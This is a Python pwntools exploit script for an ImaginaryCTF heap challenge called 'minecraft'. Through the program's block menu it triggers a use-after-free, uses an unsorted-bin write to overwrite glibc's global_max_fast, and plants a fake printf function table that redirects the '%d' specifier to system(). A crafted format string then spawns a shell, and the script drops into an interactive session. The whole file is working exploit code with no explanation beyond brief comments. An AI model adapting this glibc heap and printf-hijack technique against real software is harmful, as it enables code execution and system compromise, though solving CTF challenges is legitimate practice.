#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from pwn import pause

exe = context.binary = ELF("./vuln")
host = args.HOST or "minecraft.chal.imaginaryctf.org"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
set follow-fork-mode parent
continue
""".format(
    **locals()
)

libc = SetupLibcELF()

io = start()


def breakBlock(idx, keep):
    sla(b"(l)eak the end poem", b"b")
    sla(b"idx", str(idx).encode("latin-1"))
    sla(b"keep in inventory?", keep)


def viewBlock(idx):
    sla(b"(l)eak the end poem", b"l")
    sla(b"idx", str(idx).encode("latin-1"))


def placeBlock(idx, len, content):
    sla(b"(l)eak the end poem", b"p")
    sla(b"idx", str(idx).encode("latin-1"))
    sla(b"len", str(len).encode("latin-1"))
    sla(b"type of block:", content)
    return idx


def replaceBlock(idx, content):
    sla(b"(l)eak the end poem", b"r")
    sla(b"idx", str(idx).encode("latin-1"))
    sa(b"type of block:", content)


def offset2size(ofs):
    return (ofs) * 2 - 0x10


def get_table_offset(ASCII_val):
    return (ord(ASCII_val) - 2) * 8


MAIN_ARENA = 0x3EBC40
GLOBAL_MAX_FAST = 0x3ED940
PRINTF_FUNCTABLE = 0x3F0738
PRINTF_ARGINFO = 0x3EC870
ONE_GADGET = 0x10A38C

payload = b"%X\x00"
fake_tbl = flat(
    {
        get_table_offset("d"): p(exe.sym.system),  # 0x4f322 0x10a38c
    },
    filler=b"\x00",
)
placeBlock(9, 0x520, b"AAAA")  # junk
a = placeBlock(0, 0x520, b"AAAA")
b = placeBlock(1, offset2size(PRINTF_FUNCTABLE - MAIN_ARENA), b"AAAA")
c = placeBlock(2, offset2size(PRINTF_ARGINFO - MAIN_ARENA), fake_tbl)
placeBlock(3, 0x520, b"%d\x00".ljust(0x520 - 1, b"C"))  # junk

breakBlock(a, b"y")  # trigger UAF

replaceBlock(
    a, p(0xDEADBEF) + p16(0xF940 - 0x10)
)  # overwrite fd and bk of unsorted bin using Write After Free primitive
placeBlock(4, 0x520, b"%.26739d\x00")  # 26739 = sh


pause()
breakBlock(b, b"n")
breakBlock(c, b"n")
pause()
viewBlock(4)

io.interactive()
